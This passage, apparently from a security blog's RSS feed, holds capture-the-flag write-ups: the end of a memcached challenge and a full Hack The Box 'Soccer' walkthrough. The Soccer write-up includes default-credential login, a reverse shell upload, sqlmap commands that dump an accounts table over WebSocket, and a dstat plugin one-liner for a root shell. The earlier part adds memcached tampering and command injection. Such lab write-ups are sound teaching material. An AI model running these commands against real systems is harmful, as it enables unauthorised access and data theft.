-<p>I use Metasploit to extract information from the memcached service:</p>
-<div><pre class="hljs"><code>msf6 &gt; use auxiliary/gather/memcached_extractor
-
-msf6 auxiliary(gather/memcached<span class="hljs-emphasis">_extractor) &gt; set rhosts 10.0.100.142 
-rhosts =&gt; 10.0.100.142
-msf6 auxiliary(gather/memcached_</span>extractor) &gt; exploit
-
-[+] 10.0.100.142:11211    - Found 1 keys
-
-<span class="hljs-section">Keys/Values Found for 10.0.100.142:11211
-========================================</span>
-
-<span class="hljs-code"> Key     Value</span>
-<span class="hljs-code"> ---     -----</span>
-<span class="hljs-code"> ETSCTF  "VALUE ETSCTF 0 39\r\nETSCTF_&lt;REDACTED&gt;\r\nEND\r\n"</span>
-</code></pre></div>
-<p>A flag is found in the memcached service.</p>
-<h2 id="exploitation-phase">Exploitation Phase</h2>
-<h3 id="using-telnet-to-modify-memcached">Using Telnet to Modify Memcached</h3>
-<p>The key is to store my IP address in the memcached service as <code>REMOTE_ADDR</code>. After some research, I use telnet to connect and store my IP address:</p>
-<div><pre class="hljs"><code><span class="hljs-attribute">telnet</span> <span class="hljs-number">10.0.100.142</span> <span class="hljs-number">11211</span>
-<span class="hljs-attribute">Trying</span> <span class="hljs-number">10.0.100.142</span>...
-<span class="hljs-attribute">Connected</span> to <span class="hljs-number">10.0.100.142</span>.
-<span class="hljs-attribute">Escape</span> character is '^]'.
-<span class="hljs-attribute">add</span> REMOTE_ADDR <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">10</span>
-<span class="hljs-section">&lt;My IP&gt;</span>
-<span class="hljs-attribute">STORED</span></code></pre></div>
-<h3 id="accessing-the-web-server">Accessing the Web Server</h3>
-<p>Once my address is stored, I can access the web server, which presents a command line interface:<br />
-<img src="/_resources/4b2e3bd1f2054998b3142bfda29db88b.png" /></p>
-<p>Two flags are visible. Using a semicolon (<code>;</code>), I can run other commands and see that it runs as root. By executing:</p>
-<div><pre class="hljs"><code><span class="hljs-keyword">grep</span> -r <span class="hljs-string">'ETSCTF'</span> /</code></pre></div>
-<p>All flags are found.</p>
-]]></content:encoded>
-        </item>
-        <item>
-            <title><![CDATA[Soccer - An HTB easy machine]]></title>
-            <guid>40ebb97956d7435b8fe5ded12ddb2d3f</guid>
-            <pubDate>Sat, 15 Feb 2025 16:41:34 GMT</pubDate>
-            <content:encoded><![CDATA[<p><img src="/_resources/ea61b8d11797440cbeddc13be3a74d38.png" /></p>
-<p><a title="https://app.hackthebox.com/machines/Soccer" href="https://app.hackthebox.com/machines/Soccer">Link to target</a></p>
-<h1 id="capture-the-flag-ctf-write-up-soccerhtb">Capture the Flag (CTF) Write-Up: Soccer.htb</h1>
-<h2 id="table-of-contents">Table of Contents</h2>
-<ol>
-<li><a title="#initial-enumeration" href="#initial-enumeration">Initial Enumeration</a>
-<ul>
-<li><a title="#nmap-scan" href="#nmap-scan">Nmap Scan</a></li>
-<li><a title="#key-findings" href="#key-findings">Key Findings</a></li>
-</ul>
-</li>
-<li><a title="#enumeration-and-exploitation" href="#enumeration-and-exploitation">Enumeration and Exploitation</a>
-<ul>
-<li><a title="#discovering-tiny-file-manager" href="#discovering-tiny-file-manager">Discovering Tiny File Manager</a></li>
-<li><a title="#exploiting-tiny-file-manager" href="#exploiting-tiny-file-manager">Exploiting Tiny File Manager</a></li>
-<li><a title="#uploading-reverse-shell" href="#uploading-reverse-shell">Uploading Reverse Shell</a></li>
-</ul>
-</li>
-<li><a title="#post-exploitation" href="#post-exploitation">Post-Exploitation</a>
-<ul>
-<li><a title="#discovering-virtual-host" href="#discovering-virtual-host">Discovering Virtual Host</a></li>
-<li><a title="#analyzing-new-web-application" href="#analyzing-new-web-application">Analyzing New Web Application</a></li>
-<li><a title="#sql-injection-via-websockets" href="#sql-injection-via-websockets">SQL Injection via WebSockets</a></li>
-</ul>
-</li>
-<li><a title="#privilege-escalation" href="#privilege-escalation">Privilege Escalation</a>
-<ul>
-<li><a title="#analyzing-suid-programs" href="#analyzing-suid-programs">Analyzing SUID Programs</a></li>
-<li><a title="#exploiting-dstat-with-custom-plugin" href="#exploiting-dstat-with-custom-plugin">Exploiting dstat with Custom Plugin</a></li>
-</ul>
-</li>
-<li><a title="#conclusion" href="#conclusion">Conclusion</a></li>
-</ol>
-<hr />
-<h2 id="initial-enumeration">Initial Enumeration</h2>
-<h3 id="nmap-scan">Nmap Scan</h3>
-<p>I started with an <strong>Nmap</strong> scan to identify open ports and services.</p>
-<div><pre class="hljs"><code>nmap -sV -sC -oN nmap.txt 10.10.11.194
-PORT     STATE SERVICE         VERSION
-22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5
-80/tcp   open  http            nginx 1.18.0 (Ubuntu)
-9091/tcp open  xmltec-xmlmail?</code></pre></div>
-<h3 id="key-findings">Key Findings</h3>
-<ul>
-<li><strong>HTTP Server:</strong> Accessible at <code>http://soccer.htb/</code>.</li>
-<li><strong>SSH Service:</strong> Running OpenSSH 8.2p1.</li>
-<li><strong>Unusual Service:</strong> Port 9091 showing potential custom functionality.</li>
-</ul>
-<h2 id="enumeration-and-exploitation">Enumeration and Exploitation</h2>
-<h3 id="discovering-tiny-file-manager">Discovering Tiny File Manager</h3>
-<p>Using directory brute-forcing tools like <strong>ffuf</strong>, I discovered a Tiny File Manager instance:<br />
-<img src="/_resources/ef871f25c1754f4099c77035ad2cf3f9.png" /></p>
-<ul>
-<li><strong>URL:</strong> <code>http://soccer.htb/tiny/</code></li>
-<li><strong>Version:</strong> 2.4.3 (retrieved from source code comments).</li>
-</ul>
-<h3 id="exploiting-tiny-file-manager">Exploiting Tiny File Manager</h3>
-<p>After searching online, I found the <strong>default credentials</strong> for Tiny File Manager:<br />
-<img src="/_resources/0aed78a5341e4b21928aaf271d20ab4b.png" /></p>
-<ul>
-<li><strong>Username:</strong> admin</li>
-<li><strong>Password:</strong> admin@123</li>
-</ul>
-<p>Using these credentials, I logged into the file manager successfully.</p>
-<p><img src="/_resources/eedc4d3d8ff8435c91823d33b2ef0302.png" /></p>
-<h3 id="uploading-reverse-shell">Uploading Reverse Shell</h3>
-<p>I noticed that the <strong>uploads</strong> directory had write permissions. I created a <strong>PHP reverse shell</strong> and uploaded it through the file manager.</p>
-<p>With the shell uploaded, I accessed it to gain an initial foothold on the server.</p>
-<h2 id="post-exploitation">Post-Exploitation</h2>
-<h3 id="discovering-virtual-host">Discovering Virtual Host</h3>
-<p>While enumerating <strong>nginx configuration files</strong>, I identified a virtual host configuration pointing to a secondary application.</p>
-<ul>
-<li><strong>Virtual Host:</strong> <code>soc-player.soccer.htb</code></li>
-</ul>
-<p><img src="/_resources/b89a83ece45b45cdbeb5b52a388e3904.png" /></p>
-<h3 id="analyzing-new-web-application">Analyzing New Web Application</h3>
-<p><img src="/_resources/f8f50c66bd644da6b60e8126e1b6c014.png" /></p>
-<p>The new application presented a <strong>login page</strong>. After creating an account, I observed that it utilized <strong>WebSocket requests</strong> to handle input.</p>
-<p><img src="/_resources/9eb961d2ebfb4f3ea5d6824ccc090b58.png" /></p>
-<ul>
-<li>Example WebSocket request:<div><pre class="hljs"><code><span class="hljs-punctuation">{</span><span class="hljs-attr">"id"</span><span class="hljs-punctuation">:</span><span class="hljs-string">"text"</span><span class="hljs-punctuation">}</span></code></pre></div>
-</li>
-</ul>
-<h3 id="sql-injection-via-websockets">SQL Injection via WebSockets</h3>
-<p>Using <strong>sqlmap</strong>, I tested for SQL injection in the WebSocket endpoint:</p>
-<p><img src="/_resources/2e8971d7d3da403c9ba883bb36e4d09b.png" /></p>
-<div><pre class="hljs"><code>sqlmap -u <span class="hljs-string">"ws://soc-player.soccer.htb:9091"</span> --data <span class="hljs-string">'{"id": "*"}'</span> --dbs --threads 10 --level 5 --risk 3 --batch</code></pre></div>
-<p>Results:</p>
-<div><pre class="hljs"><code>back-end DBMS: MySQL &gt;= 5.0.12
-available databases <span class="hljs-comment">[5]</span>:
-<span class="hljs-comment">[*]</span> information_schema
-<span class="hljs-comment">[*]</span> mysql
-<span class="hljs-comment">[*]</span> performance_schema
-<span class="hljs-comment">[*]</span> soccer_db
-<span class="hljs-comment">[*]</span> sys</code></pre></div>
-<p>Dumping the accounts table from soccer_db:</p>
-<div><pre class="hljs"><code>sqlmap -u <span class="hljs-string">"ws://soc-player.soccer.htb:9091"</span> <span class="hljs-params">--data</span> '{<span class="hljs-string">"id"</span>: <span class="hljs-string">"*"</span>}' -D soccer_db -T accounts <span class="hljs-params">--dump</span> <span class="hljs-params">--threads</span> 10 <span class="hljs-params">--level</span> 5 <span class="hljs-params">--risk</span> 3 <span class="hljs-params">--batch</span></code></pre></div>
-<div><pre class="hljs"><code><span class="hljs-section">| id   | email             | password   | username |
-+------+-------------------+----------------------+----------+</span>
-<span class="hljs-section">| 1324 | player@player.htb | *REDACTED* | player   |
-+------+-------------------+----------------------+----------+</span></code></pre></div>
-<h2 id="privilege-escalation">Privilege Escalation</h2>
-<h3 id="analyzing-suid-programs">Analyzing SUID Programs</h3>
-<p>After logging into SSH with the <code>player</code> credentials, I searched for SUID programs. I discovered that <code>doas</code> was configured to allow the <code>player</code> user to run <code>dstat</code> as root.</p>
-<p><strong>Configuration:</strong></p>
-<div><pre class="hljs"><code>permit nopass player as root cmd /usr/bin/dstat</code></pre></div>
-<h3 id="exploiting-dstat-with-custom-plugin">Exploiting dstat with Custom Plugin</h3>
-<p>Using the information from <a title="https://gtfobins.github.io/gtfobins/dstat/" href="https://gtfobins.github.io/gtfobins/dstat/">GTFOBins</a>, I created a custom plugin to execute arbitrary commands:</p>
-<ol>
-<li>
-<p>Create the plugin:</p>
-<div><pre class="hljs"><code>echo <span class="hljs-string">'import os; os.execv("/bin/sh", ["sh"])'</span> &gt; /usr/local/share/dstat/dstat_xxx.py</code></pre></div>
-</li>
-<li>
-<p>Execute <code>dstat</code> with the plugin:</p>
-<div><pre class="hljs"><code>doas -u root /usr/bin/dstat --xxx</code></pre></div>
-</li>
-</ol>
-<p><strong>Result:</strong> I obtained a root shell!</p>
-<p><img src="/_resources/ac06c9dd86e9467bab789bcf43d254fa.png" /></p>
-<h2 id="conclusion">Conclusion</h2>
-<p>This CTF demonstrated various techniques and highlighted critical vulnerabilities in system and application security:</p>
-<ul>
-<li><strong>Enumeration:</strong> Identified services and applications using tools like Nmap and ffuf.</li>
-<li><strong>Exploitation:</strong> Gained access via default credentials on Tiny File Manager and exploited SQL injection vulnerabilities in WebSocket endpoints.</li>
-<li><strong>Post-Exploitation:</strong> Used the initial foothold to uncover misconfigurations in the system, such as virtual host information and database credentials.</li>
-<li><strong>Privilege Escalation:</strong> Leveraged a misconfigured <code>doas</code> command to exploit the <code>dstat</code> program with a custom plugin and escalate privileges to root.</li>
-</ul>
-<p>This challenge underscored the importance of:</p>
-<ol>
-<li>Properly securing web applications (e.g., avoid default credentials).</li>
-<li>Validating inputs to prevent SQL injection.</li>
-<li>Configuring SUID programs and privilege escalation paths securely.</li>
-</ol>
-<p>In the end, I successfully obtained root access, completing the challenge.</p>
 ]]></content:encoded>
         </item>
     </channel>
